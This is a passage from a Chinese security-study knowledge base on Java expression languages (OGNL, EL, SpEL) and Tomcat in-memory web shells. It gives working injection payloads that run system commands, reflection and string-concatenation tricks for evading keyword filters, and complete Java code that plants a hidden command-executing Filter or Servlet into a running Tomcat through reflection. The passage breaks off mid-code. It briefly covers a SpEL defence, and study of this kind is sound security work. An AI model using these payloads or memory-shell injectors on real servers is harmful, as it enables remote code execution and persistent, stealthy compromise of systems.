构造任意对象：直接使用已知的对象的构造方法进行构造。 System.out.println(Ognl.getValue(\"{'key1','value1'}\", null)); // [key1, value1] System.out.println(Ognl.getValue(\"#{'key1':'value1'}\", null)); // {key1=value1} System.out.println(Ognl.getValue(\"new java.lang.String('123')\", null)); // 123 # 和 % 和 $ 的区别 #符 #符主要有三种用途： 访问非根对象属性，即访问OGNL上下文和Action上下文，由于Struts2中值栈被视为根对象，所以访问其他非根对象时需要加#前缀，#相当于ActionContext.getContext()； 用于过滤和投影（projecting）集合，如books.{? #this.price； 用于构造Map，如#{'foo1':'bar1', 'foo2':'bar2'}； %符 %符的用途是在标志的属性为字符串类型时，告诉执行环境%{}里的是OGNL表达式并计算表达式的值。 $符 $符的主要作用是在相关配置文件中引入OGNL表达式，让其在配置文件中也能解析OGNL表达式。（换句话说，$用于在配置文件中获取ValueStack的值用的）。 # 和 . 和 @ 的区别 获取静态函数和变量的时候用@ 获取非静态函数用.号获取 获取非静态变量用#获取 OGNL表达式注入 webwork2和现在的Struts2.x中使用OGNL取代原来的EL来做界面数据绑定，所谓界面数据绑定，也就是把界面元素（例如一个textfield,hidden)和对象层某个类的某个属性绑定在一起，修改和显示自动同步。而Struts2框架正是因为滥用OGNL表达式，使之成为了“漏洞之王”。 由前面知道，OGNL可以访问静态方法、属性以及对象方法等，其中包含可以执行恶意操作如命令执行的类java.lang.Runtime等，当OGNL表达式外部可控时，攻击者就可以构造恶意的OGNL表达式来让程序执行恶意操作，这就是OGNL表达式注入漏洞。 注入举例 格式@[class]@[field/method()] package org.example; import ognl.Ognl; import ognl.OgnlException; public class OgnlTest { public static void main(String[] args) throws OgnlException { // @[class]@[field/method()] String payload = \"@java.lang.Runtime@getRuntime().exec('open -na Calculator')\"; System.out.println(Ognl.getValue(payload, null)); } } 能解析OGNL的API 能解析OGNL的API如下表： 类名 方法名 com.opensymphony.xwork2.util.TextParseUtil translateVariables,translateVariablesCollection com.opensymphony.xwork2.util.TextParser evaluate com.opensymphony.xwork2.util.OgnlTextParser evaluate com.opensymphony.xwork2.ognl.OgnlUtil setProperties,setProperty,setValue,getValue,callMethod,compile com.opensymphony.xwork2.util.ValueStack findString,findValue,setValue,setParameter com.opensymphony.xwork2.ognl.OgnlValueStack findString,findValue,setValue,setParameter,trySetValue org.apache.struts2.util.VelocityStrutsUtil evaluate org.apache.struts2.util.StrutsUtil isTrue,findString,findValue,getText,translateVariables,makeSelectList org.apache.struts2.views.jsp.ui.OgnlTool findValue ognl.Ognl parseExpression,getValue,setValue 以下是调用过程中可能会涉及到的一些类： 涉及类名 方法名 com.opensymphony.xwork2.ognl.OgnlReflectionProvider getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue com.opensymphony.xwork2.util.reflection.ReflectionProvider getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue HTTP请求中常见的注入点 常用payload //获取context里面的变量值 #user #user.name //使用runtime执行系统命令 @java.lang.Runtime@getRuntime().exec(\"calc\") //使用processbuilder执行系统命令 (new java.lang.ProcessBuilder(new java.lang.String[]{\"calc\"})).start() //获取当前绝对路径 @java.lang.System@getProperty(\"user.dir\") // e-mobole带回显 @org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream()) 参考 OGNL表达式注入漏洞总结 Struts2著名RCE漏洞引发的十年之思 Struts2 中的OGNL、表达式注入及防御 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-06 13:07:05 "},"知识库/02.JAVA安全/08.EL表达式/":{"url":"知识库/02.JAVA安全/08.EL表达式/","title":"08.EL表达式","keywords":"","body":"介绍 EL 全名为Expression Language，是为了使JSP写起来更加简单。表达式语言的灵感来自于 ECMAScript 和 XPath 表达式语言，它提供了在 JSP 中简化表达式的方法，让Jsp的代码更加简化。 EL主要作用： 获取数据 EL表达式主要用于替换JSP页面中的脚本表达式，以从各种类型的web域 中检索java对象、获取数据。(某个web域 中的对象，访问javabean的属性、访问list集合、访问map集合、访问数组) 执行运算 利用EL表达式可以在JSP页面中执行一些基本的关系运算、逻辑运算和算术运算，以在JSP页面中完成一些简单的逻辑运算。${user==null} 获取web开发常用对象 EL 表达式定义了一些隐式对象，利用这些隐式对象，web开发人员可以很轻松获得对web常用对象的引用，从而获得这些对象中的数据。 调用Java方法 EL表达式允许用户开发自定义EL函数，以在JSP页面中通过EL表达式调用Java类的方法。 快速搭建tomcat环境 因为需要使用到JSP来学习EL表达式，所以想法是快速搭一个tomcat环境，之前采用的是添加tomcat依赖到pom.xml的方法，使用内置tomcat，但是感觉搭建环境速度太慢了，所以学了个新的方法来快速搭建tomcat环境 参考：https://blog.51cto.com/u_15119353/3309943 前期准备 tomcat可用版 IDEA tomcat各版本下载地址：https://archive.apache.org/dist/tomcat/tomcat-8/ 环境搭建 先建一个平平无奇的Java项目 然后右键，选择Add Framework Support... 勾选Web Application 这个时候就会多一个web目录，也就是我们的webapps目录 打开Project Structure窗口，新建2个文件夹在WEB-INF目录下，分别是classes和lib，这一步是为了添加项目类路径 修改编译后的类路径到我们刚才新建的classes目录下 添加本地tomcat服务器 配置好需要的信息，然后Fix修复一下 给应用上下文路径设置为跟路径，如果这里设置为/a 则访问就变成 localhost:8080/a/ 然后启动运行即可 项目结构 EL表达式使用 EL基础语法 在JSP中访问模型对象是通过EL表达式的语法来表达。所有EL表达式的格式都是以${}表示。 例如，${userinfo}代表获取变量userinfo的值。当EL表达式中的变量不给定范围时，则默认在page范围查找，然后依次在request、session、application范围查找。也可以用范围作为前缀表示属于哪个范围的变量，例如：${pageScope.userinfo}表示访问page范围中的userinfo变量。 简单地说，使用EL表达式语法：${EL表达式} 其中，EL表达式和JSP代码等价转换。事实上，可以将EL表达式理解为一种简化的JSP代码。 扩展JSP代码的写法总结： JSP表达式： 向浏览器输出变量或表达式的计算结果。 JSP脚本： 执行java代码的原理：翻译到_jspService()方法中。 JSP声明： 声明jsp的成员变量或成员方法。 JSP注释： 用于注释JSP代码，不会翻译到Java文件中，也不会执行。 [ ]与.运算符 EL表达式提供.和[]两种运算符来存取数据。 当要存取的属性名称中包含一些特殊字符，如.或-等并非字母或数字的符号，就一定要使用[]。例如：${user.My-Name}应当改为${user[\"My-Name\"]}。 如果要动态取值时，就可以用[]来做，而.无法做到动态取值。例如：${sessionScope.user[data]}中data 是一个变量。 获取变量举例 map = new HashMap<>(); map.put(\"my-name\", \"admin\"); request.setAttribute(\"test\", map); %> 从四个作用域中搜索变量：${name} 从requestScope作用域中获取变量：${requestScope.request} 从sessionScope作用域中获取变量：${sessionScope.session} 从pageScope作用域中获取变量：${pageScope.page} 从applicationScope作用域中获取变量：${applicationScope.application} 从作用域中获取特殊符号变量：${requestScope.test[\"my-name\"]} 操作符 类型 符号 算术型 +、-（二元）、*、/、div、%、mod、-（一元） 逻辑型 and、&&、or、\\ \\ 、!、not 关系型 ==、eq、!=、ne、、gt、=、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。 空 empty 空操作符是前缀操作，可用于确定值是否为空。 条件型 A ?B :C 。根据 A 赋值的结果来赋值 B 或 C。 运算符优先级如下（从高到低，从左到右）： [] . () (用于更改运算符的优先) - (一元) not ! empty * / div % mod + - (二元) += <> = lt gt le ge == != eq ne && and || or ? : -> = ; 隐含对象 EL表达式语言中定义了11个隐含对象，使用这些隐含对象可以很方便地获取web开发中的一些常见对象，并读取这些对象的数据。 语法：${隐式对象名称}：获得对象的引用 序号 隐含对象名称 描 述 1 pageContext 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。） 2 pageScope 代表page域中用于保存属性的Map对象 3 requestScope 代表request域中用于保存属性的Map对象 4 sessionScope 代表session域中用于保存属性的Map对象 5 applicationScope 代表application域中用于保存属性的Map对象 6 param 表示一个保存了所有请求参数的Map对象 7 paramValues 表示一个保存了所有请求参数的Map对象，它对于某个请求参数，返回的是一个string[] 8 header 表示一个保存了所有http请求头字段的Map对象，注意：如果头里面有“-” ，例Accept-Encoding，则要header[“Accept-Encoding”] 9 headerValues 表示一个保存了所有http请求头字段的Map对象，它对于某个请求参数，返回的是一个string[]数组。注意：如果头里面有“-” ，例Accept-Encoding，则要headerValues[“Accept-Encoding”] 10 cookie 表示一个保存了所有cookie的Map对象 11 initParam 表示一个保存了所有web应用初始化参数的map对象 函数 EL表达式语法允许开发人员开发自定义函数，以调用Java类的方法。语法：${prefix：method(params)} 在EL表达式中调用的只能是Java类的静态方法，这个Java类的静态方法需要在TLD文件中描述，才可以被EL表达式调用。 EL自定义函数用于扩展EL表达式的功能，可以让EL表达式完成普通Java程序代码所能完成的功能。 举例： ==>编写一个让所有字符大写的函数 一般来说， EL自定义函数开发与应用包括以下三个步骤： 1、编写一个Java类的静态方法 2、编写标签库描述符（tld）文件，在tld文件中描述自定义函数。 3、在JSP页面中导入和使用自定义函数 1、编写一个Java类的静态方法，代码如下 public class ELFunc { public static String up(String message) { if (message == null){ return null; } return message.toUpperCase(); } } 2、编写标签库描述符（tld）文件，在tld文件中描述自定义函数。 ELFunc.tld位置 代码 1.0 ELFunc --> /ELFunc 子元素用于指定EL自定义函数的名称--> up 子元素用于指定完整的Java类名--> ELFunc 子元素用于指定Java类中的静态方法的签名， 20 方法签名必须指明方法的返回值类型及各个参数的类型，各个参数之间用逗号分隔。--> java.lang.String up(java.lang.String) 3、在JSP页面中导入和使用自定义函数 ${fn:up(\"123aaabbbCCC\")} 实验了好久代码应该是没问题的，但是还是有报错，后面需要再解决这个问题吧，今天是解决不了了，不然一天没了。。。 禁用/启用EL表达式 全局禁用EL表达式，web.xml中进入如下配置： *.jsp true 单个文件禁用EL表达式 在JSP文件中可以有如下定义： 该语句表示是否禁用EL表达式，TRUE表示禁止，FALSE表示不禁止。 JSP2.0中默认的启用EL表达式。 EL表达式注入 原理都是一样的：表达式全部或部份外部可控。列一些通用的poc //对应于JSP页面中的pageContext对象（注意：取的是pageContext对象） ${pageContext} //获取Web路径 ${pageContext.getSession().getServletContext().getClassLoader().getResource(\"\")} //文件头参数 ${header} //获取webRoot ${applicationScope} //执行命令 ${pageContext.request.getSession().setAttribute(\"a\",pageContext.request.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"calc\").getInputStream())} EL表达式注入绕过 通过 charAt 与 toChars 获取字符，在由 toString 转字符串再用 concat 拼接来绕过一些敏感字符的过滤 ${\"xxx\".toString().charAt(0).toChars(97)[0].toString()} ${\"xxx\".toString().charAt(0).toChars(97)[0].toString().concat(\"xxx\".toString().charAt(0).toChars(98)[0].toString())} 通过以上代码，只需要修改toChars()中的ascii码值就可以变成任意字符 参考 javaweb学习总结(二十九)——EL表达式 浅析EL表达式注入漏洞 （很详细） Java EL （Expression Language）表达式注入 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-26 20:30:28 "},"知识库/02.JAVA安全/09.SpEL表达式/":{"url":"知识库/02.JAVA安全/09.SpEL表达式/","title":"09.SpEL表达式","keywords":"","body":"介绍 Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。 SpEL的诞生是为了给 Spring 社区提供一种能够与 Spring 生态系统所有产品无缝对接，能提供一站式支持的表达式语言。 Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEl可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。 基础使用 先新建一个Spring项目 pom.xml org.springframework spring-expression 5.2.12.RELEASE 基础例子 一个简单的Controller message为get传入的参数 ExpressionParser接口负责解析表达式字符串 getValue方法执行表达式并返回结果 默认容器是spring本身的容器：ApplicationContext package com.spel.test.demo; import org.springframework.expression.Expression; import org.springframework.expression.ExpressionParser; import org.springframework.expression.spel.standard.SpelExpressionParser; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController public class HelloController { @GetMapping(\"/test\") public String catUser(String message) { ExpressionParser parser = new SpelExpressionParser(); Expression expression = parser.parseExpression(message); return expression.getValue().toString(); } } 访问 http://127.0.0.1:8080/test?message=T(java.lang.Math).random()*100，可见成功得到一个随机数，说明表达式被执行了 访问 http://127.0.0.1:8080/test?message=new%20java.lang.ProcessBuilder(%22whoami%22).start() 可以直接执行系统命令 SpEL语法 SpEL使用 #{...} 作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法如： 引用其他对象:#{car} 引用其他对象的属性：#{car.brand} 调用其它方法 , 还可以链式操作：#{car.toString()} 其中属性名称引用还可以用$符号 如：${someProperty} 除此以外在SpEL中，使用T()运算符会调用类作用域的方法和常量。例如，在SpEL中使用Java的Math类，我们可以像下面的示例这样使用T()运算符： #{T(java.lang.Math)} 演示因为是本地环境，且是将输入的参数直接当成SpEL表达式去执行的，所以没有输入#{}，但是如果用@Value去获取值执行就需要了 @Value(\"#{ T(java.lang.Math).random() * 100.0 }\") private int rand; SpEL表达式分类 基本表达式 字面量表达式、关系，逻辑与算数运算表达式、字符串链接及截取表达式、三目运算、正则表达式以及括号优先级表达式； 类相关表达式 类类型表达式、类实例化、instanceof 表达式、变量定义及引用、赋值表达式、自定义函数、对象属性存取及安全导航表达式、对象方法调用、Bean 引用； 集合相关表达式 内联 List、内联数组、集合、字典访问、列表、字典； 其他表达式 模版表达式 SpEL类相关表达式‼️ 类类型表达式 使用\"T(Type)\"来表示 java.lang.Class 实例，\"Type\"必须是类全限定名，\"java.lang\"包除外，即该包下的类可以不指定包名；使用类类型表达式还可以进行访问类静态方法及类静态字段。 举例 // java.lang 包类访问 T(String) // 其他包类访问 T(java.lang.Runtime).getRuntime().exec('open -na Calculator') //类静态字段访问 T(Integer).MAX_VALUE //类静态方法调用 T(Integer).parseInt('1') 类实例化 类实例化同样使用 java 关键字「new」，类名必须是全限定名，但 java.lang 包内的类型除外，如 String、Integer。 new java.util.Date() instanceof 表达式 SpEL 支持 instanceof 运算符，跟 Java 内使用同义 \"test\" instanceof T(String) 常用payload ${12*12} T(java.lang.Runtime).getRuntime().exec(\"open -na Calculator\") T(Thread).sleep(10000) #this.getClass().forName('java.lang.Runtime').getRuntime().exec('open -na Calculator') new java.lang.ProcessBuilder('open -na Calculator').start() 回显 引入了org.apache.commons.io这个包的话，可以输出回显 T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(\"whoami\").getInputStream()) 绕过方式 如果采用关键词过滤，可以采用反射的方式来绕过 T(String).class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"open%20-na%20Calculator\") // + 一定要用url编码，不然浏览器解析会有问题 T(String).class.forName(\"java.lang.Ru\"%2b\"ntime\").getMethod(\"getRu\"%2b\"ntime\").invoke(null).exec(\"open%20-na%20Calculator\") T(String).getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).getClass().getMethod(\"exec\",T(String)).invoke(T(java.lang.Runtime).getRuntime(),\"open%20-na%20Calculator\") 使用ScriptEngineManager构造 T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"nashorn\").eval(\"java.lang.Runtime.getRuntime().exec('open -na Calculator')\") T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"nashorn\").eval(\"java.lang.Runt\"%2b\"ime.getRu\"%2b\"ntime().e\"%2b\"xec('open -na Calculator')\") 如果不能使用双引号，那么可以采用生成任意字符+concat函数的形式进行绕过 T(java.lang.Character).toString(97).concat(T(java.lang.Character).toString(98)) 防御 因为SpEL表达式注入漏洞导致攻击者可以通过表达式执行精心构造的任意代码，导致命令执行。为了防御该类漏洞，Spring官方推出了SimpleEvaluationContext作为安全类来防御该类漏洞。 官方文档：https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html SimpleEvaluationContext 旨在仅支持 SpEL 语言语法的一个子集。它不包括 Java 类型引用，构造函数和 bean 引用；所以最直接的修复方式是使用 SimpleEvaluationContext 替换 StandardEvaluationContext。 基础举例 ExpressionParser parser = new SpelExpressionParser(); Expression expression = parser.parseExpression(message); EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(message).build(); return expression.getValue(context).toString(); 参考 Java代码审计之SpEL表达式注入 由浅入深SpEL表达式注入漏洞 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:00:50 "},"知识库/02.JAVA安全/10.Tomcat内存马基础入门/10.Tomcat内存马基础入门.html":{"url":"知识库/02.JAVA安全/10.Tomcat内存马基础入门/10.Tomcat内存马基础入门.html","title":"10.Tomcat内存马基础入门","keywords":"","body":"https://mp.weixin.qq.com/s/-jXAHHRCRilHrNN49QBcjQ Servlet web介绍 Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。 使用 Servlet，您可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。 Java Servlet 通常情况下与使用 CGI（Common Gateway Interface，公共网关接口）实现的程序可以达到异曲同工的效果。但是相比于 CGI，Servlet 有以下几点优势 性能明显更好。 Servlet 在 Web 服务器的地址空间内执行。这样它就没有必要再创建一个单独的进程来处理每个客户端请求。 Servlet 是独立于平台的，因为它们是用 Java 编写的。 服务器上的 Java 安全管理器执行了一系列限制，以保护服务器计算机上的资源。因此，Servlet 是可信的。 Java 类库的全部功能对 Servlet 来说都是可用的。它可以通过 sockets 和 RMI 机制与 applets、数据库或其他软件进行交互。 创建第一个Servlet web application step 1：使用idea 创建一个 web Application step 2：添加相关的依赖包（$tomcat/lib/servlet-api.jar） 右键项目 Open Moudle Setting 或者如下箭头的快捷键，添加依赖($tomcat/lib/.jar) step 3：新建Servlet step 4：配置Tomcat 这里有告警，说没有artifacts，首先确定是否Project Structure 下 Module里是否包含我们的项目 以及artifacts里是否有 确定都有再点fix step 5：启动项目 在创建的Servlet(Helloworld.class)中填写如下代码 import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.PrintWriter; @WebServlet(name = \"HelloWorld\") public class HelloWorld extends HttpServlet { private String message; public void init() throws ServletException{ message = \"This is my first Servlet Application\"; } protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { // 设置:响应内容类型 response.setContentType(\"text/html\"); // 输出文本 PrintWriter out = response.getWriter(); out.write(\" \" + message + \" \"); } } 然后配置web.xml HelloWorld HelloWorld HelloWorld /hello 然后回到HelloWorld.class，启动web Filter 动态注入内存 Filter是java web中的过滤器，会对客户端发送的请求进行过滤并做一些操作，我们可以在filter中写入命令执行的恶意文件，让客户端请求它来完成命令执行； Filter 内存马是通过动态注册以一个恶意Filter，由于是动态注册的，所以这个filter没有文件实体，存在内存中，当tomcat重启就消失了（恕我直言，解决内存马最好的办法就是重启） 一般我们把这个Filter放在所有的filter最前面优先执行，这样我们的请求就不会受到其他filter的干扰 需要动态注册filter就需要添加filter相关的函数 ServletContext javax.servlet.servletContext中存在addFilter，addServlet，addListener方法，即添加Filter，Servlet，Listener this.getServletContext();，this.getServletConfig().getServletContext(); 是获取ServletContext的方法 ApplicationContext 在Tomcat中，org.apache.catalina.core.ApplicationContext中包含一个ServletContext接口的实现，所以需要引入org.apache.catalina.core.ApplicationContext这个库，用它获取Context Filter相关变量 filterMaps 变量：包含所有过滤器的URL映射关系 filterDefs 变量：包含所有过滤器包括实例内部等变量 filterConfigs 变量：包含所有与过滤器对应的filterDef信息及过滤器实例，进行过滤器进行管理 org.apache.catalina.core.ApplicationFilterConfig 在tomcat不同版本需要通过不同的库引入FilterMap和FilterDef import org.apache.catalina.deploy.FilterMap; import org.apache.catalina.deploy.FilterDef; // tomcat 8/9 import org.apache.tomcat.util.descriptor.web.FilterDef; import org.apache.tomcat.util.descriptor.web.FilterMap; 创建一个Filter，查看结构 package Filter; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import java.io.IOException; @WebFilter(filterName = \"FilterDemo\") public class FilterDemo implements Filter { public void destroy() { } public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException { System.out.println(\"exec filter\"); chain.doFilter(req,resp); } public void init(FilterConfig config) throws ServletException { System.out.println(\"init filter\"); } } FilterDemo中有init，doFilter，destory三个重要方法 init()方法：初始化参数，在创建Filter时自动调用，当我们需要设置初始化参数的时候，可以写到该方法中。 doFilter()方法：拦截到要执行的请求时，doFilter就会执行。这里面写我们对请求和响应的预处理 destory()方法：在销毁Filter时自动调用 对我们来说，init和destory不需要做什么，只需要写一个doFilter方法拦截需要的请求，将其参数用于Runtime.getRuntime().exec()做命令执行，并将返回的数据打印到Response中即可，如下例： public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { String cmd = servletRequest.getParameter(\"cmd\"); if (cmd!= null) { Process process = Runtime.getRuntime().exec(cmd); java.io.BufferedReader bufferedReader = new java.io.BufferedReader( new java.io.InputStreamReader(process.getInputStream())); StringBuilder stringBuilder = new StringBuilder(); String line; while ((line = bufferedReader.readLine()) != null) { stringBuilder.append(line + '\\n'); } servletResponse.getOutputStream().write(stringBuilder.toString().getBytes()); servletResponse.getOutputStream().flush(); servletResponse.getOutputStream().close(); return; } filterChain.doFilter(servletRequest, servletResponse); } 动态注入 我们将filter部分写好，下一步就是实现将其注入到内存中 protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { PrintWriter out = response.getWriter(); ServletContext servletContext = request.getSession().getServletContext(); try{ Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); Field Configs = standardContext.getClass().getDeclaredField(\"filterConfigs\"); Configs.setAccessible(true); Map filterConfigs = (Map) Configs.get(standardContext); String name = \"filterDemo\"; //判断是否存在filterDemo这个filter，如果没有则准备创建 if (filterConfigs.get(name) == null){ //定义一些基础属性、类名、filter名等 FilterDemo filter = new FilterDemo(); FilterDef filterDef = new FilterDef(); filterDef.setFilterName(name); filterDef.setFilterClass(filter.getClass().getName()); filterDef.setFilter(filter); //添加filterDef standardContext.addFilterDef(filterDef); //创建filterMap，设置filter和url的映射关系,可设置成单一url如/xyz ,也可以所有页面都可触发可设置为/* FilterMap filterMap = new FilterMap(); // filterMap.addURLPattern(\"/*\"); filterMap.addURLPattern(\"/xyz\"); filterMap.setFilterName(name); filterMap.setDispatcher(DispatcherType.REQUEST.name()); //添加我们的filterMap到所有filter最前面 standardContext.addFilterMapBefore(filterMap); //反射创建FilterConfig，传入standardContext与filterDef Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef); //将filter名和配置好的filterConifg传入 filterConfigs.put(name,filterConfig); out.write(\"Inject success!\"); } else{ out.write(\"Injected!\"); } }catch(Exception e){ e.printStackTrace(); } } JSP Servlet 动态注入内存 要了解Servlet动态注入内存，那么就需要对Servlet的生命周期要有一定的了解 Servlet 生命周期 Servlet 生命周期可被定义为从创建直到毁灭的整个过程。以下是 Servlet 遵循的过程： Servlet 初始化后调用 init () 方法。 Servlet 调用 service() 方法来处理客户端的请求。 Servlet 销毁前调用 destroy() 方法。 最后，Servlet 是由 JVM 的垃圾回收器进行垃圾回收的。 init() 方法 init 方法被设计成只调用一次。它在第一次创建 Servlet 时被调用，在后续每次用户请求时不再调用。因此，它是用于一次性初始化，就像 Applet 的 init 方法一样。 Servlet 创建于用户第一次调用对应于该 Servlet 的 URL 时，但是您也可以指定 Servlet 在服务器第一次启动时被加载。 当用户调用一个 Servlet 时，就会创建一个 Servlet 实例，每一个用户请求都会产生一个新的线程，适当的时候移交给 doGet 或 doPost 方法。init() 方法简单地创建或加载一些数据，这些数据将被用于 Servlet 的整个生命周期 service() 方法 service() 方法是执行实际任务的主要方法。Servlet 容器（即 Web 服务器）调用 service() 方法来处理来自客户端（浏览器）的请求，并把格式化的响应写回给客户端。 每次服务器接收到一个 Servlet 请求时，服务器会产生一个新的线程并调用服务。service() 方法检查 HTTP 请求类型（GET、POST、PUT、DELETE 等），并在适当的时候调用 doGet、doPost、doPut，doDelete 等方法 service() 方法由容器调用，service 方法在适当的时候调用 doGet、doPost、doPut、doDelete 等方法。所以，您不用对 service() 方法做任何动作，您只需要根据来自客户端的请求类型来重写 doGet() 或 doPost() 即可。 doGet() 和 doPost() 方法是每次服务请求中最常用的方法 doGet() 方法 GET 请求来自于一个 URL 的正常请求，或者来自于一个未指定 METHOD 的 HTML 表单，它由 doGet() 方法处理 doPost() 方法 POST 请求来自于一个特别指定了 METHOD 为 POST 的 HTML 表单，它由 doPost() 方法处理 destroy() 方法 destroy() 方法只会被调用一次，在 Servlet 生命周期结束时被调用。destroy() 方法可以让您的 Servlet 关闭数据库连接、停止后台线程、把 Cookie 列表或点击计数器写入到磁盘，并执行其他类似的清理活动。 在调用 destroy() 方法之后，servlet 对象被标记为垃圾回收 service方法 在service方法中，Servlet容器在此生命周期中会处理每次来的请求，就像是“拦截器”一般 // ServletTest import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.PrintWriter; @WebServlet(name = \"ServletTest\") public class ServletTest extends HttpServlet { @Override public void init() throws ServletException { System.out.println(\"init\"); } @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { System.out.println(\"Servlet Service Test\"); } protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { // 设置:响应内容类型 response.setContentType(\"text/html\"); // 输出文本 PrintWriter out = response.getWriter(); out.write(\" Test \"); } } Helloworld Helloworld Helloworld /hello ServletTest ServletTest ServletTest /test 可以看到每刷新一次，就会打印service生命周期中的Servlet Service Test，而最重要的是没有进入doGet()，相信大家也明白什么意思了 动态注入 我们在service中写入恶意代码，这里还是以ServletTest.java文件为例，已删除web.xml中ServletTest的路由了 import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; @WebServlet(name = \"ServletTest\") public class ServletTest extends HttpServlet { @Override public void init() throws ServletException { System.out.println(\"init\"); } @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { String cmd = servletRequest.getParameter(\"cmd\"); if (cmd != null) { Process process = Runtime.getRuntime().exec(cmd); java.io.BufferedReader bufferedReader = new java.io.BufferedReader( new java.io.InputStreamReader(process.getInputStream())); StringBuilder stringBuilder = new StringBuilder(); String line; while ((line = bufferedReader.readLine()) != null) { stringBuilder.append(line + '\\n'); } servletResponse.getOutputStream().write(stringBuilder.toString().getBytes()); servletResponse.getOutputStream().flush(); servletResponse.getOutputStream().close(); return; } } protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { } } 获取context部分与filter中相同,仍然从org.apache.catalina.core.ApplicationContext反射获取 ServletContext servletContext = request.getSession().getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); 然后需要将上文写的servlet封装成wrapper再使用context添加 ServletTest demo = new ServletTest(); org.apache.catalina.Wrapper wrapper = standardContext.createWrapper(); wrapper.setName(\"xyz\"); wrapper.setLoadOnStartup(1); wrapper.setServlet(demo); wrapper.setServletClass(demo.getClass().getName()); standardContext.addChild(wrapper); standardContext.addServletMapping(\"/xyz\",\"xyz\"); out.println(\"injected Servlet success!\"); 在Helloworld 这个servlet中，我们将代码写入 import org.apache.catalina.Wrapper; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import javax.servlet.ServletContext; import javax.servlet.ServletException; import java.io.IOException; import java.io.PrintWriter; import java.lang.reflect.Field; public class Helloworld extends javax.servlet.http.HttpServlet { private String message; public void init() throws ServletException{ message = \"This is my first servlet application\"; } protected void doPost(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response) throws javax.servlet.ServletException, IOException { } protected void doGet(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response) throws javax.servlet.ServletException, IOException { PrintWriter out = response.getWriter(); try { ServletContext servletContext = request.getSession().getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); ServletTest demo = new ServletTest(); Wrapper wrapper = 